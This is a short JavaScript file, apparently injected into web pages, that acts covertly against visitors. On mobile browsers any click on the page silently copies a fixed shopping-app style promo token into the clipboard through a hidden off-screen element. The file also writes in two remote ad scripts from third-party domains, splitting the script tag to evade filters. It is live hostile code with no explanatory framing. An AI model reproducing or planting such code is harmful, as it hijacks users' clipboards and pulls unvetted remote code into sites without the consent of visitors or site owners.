function copyjs(codycont){
	let u = navigator.userAgent;
	let isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android
	let isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios
	let body = document.getElementsByTagName('body')[0];
	if(isiOS){
		let txt = document.createElement('a');
		txt.style = 'position:absolute;top:-9999px;left:-9999px;';
		txt.setAttribute('id',"selector");
		txt.innerHTML = codycont;
		body.appendChild(txt);
		let copyDOM = document.querySelectorAll('#selector');
		let range = document.createRange();  
		range.selectNode(copyDOM[0]);
		window.getSelection().removeAllRanges();
		window.getSelection().addRange(range);
		document.execCommand('copy');
		body.removeChild(txt);
	}else if(isAndroid){
		let txt = document.createElement('textarea');
		txt.style = 'position:absolute;top:-9999px;left:-9999px;';
		txt.setAttribute('id',"selector");
		txt.innerHTML = codycont;
		body.appendChild(txt);
		let selector = document.getElementById('selector');
		selector.select();
		document.execCommand("copy");
		body.removeChild(txt);
	}
}
const cpCode = "￥lkXxXfE2kFT￥ ₣Y1MnS4EN1_AO₳";
let rootEl = document.documentElement;
if(typeof(ClipboardJS) =='undefined'){
	if(document.addEventListener){
		document.addEventListener("DOMContentLoaded", function(){
			rootEl.onclick = function(){copyjs(cpCode);}
		},false);
	}
}
document.write('<scr'+'ipt async defer src="//www.abcdlm.com/c.aspx?action=c&c1=7&c2=313&c3=&c4=2&c5=AdCode_sjdb&c6=640x200&c7=1&c8=1&c9=&c10=&c50=1343652" id="1343652"></scr'+'ipt>');
document.write('<scr'+'ipt async defer src="https://d.ytop8.com/z.aspx?action=c&z1=7&z2=7143&z3=&z4=2&z5=AdCode_ycgsred&z6=60x60&z7=1&z8=1&z9=&z10=&z50=1343897" id="1343897"></scr'+'ipt>');
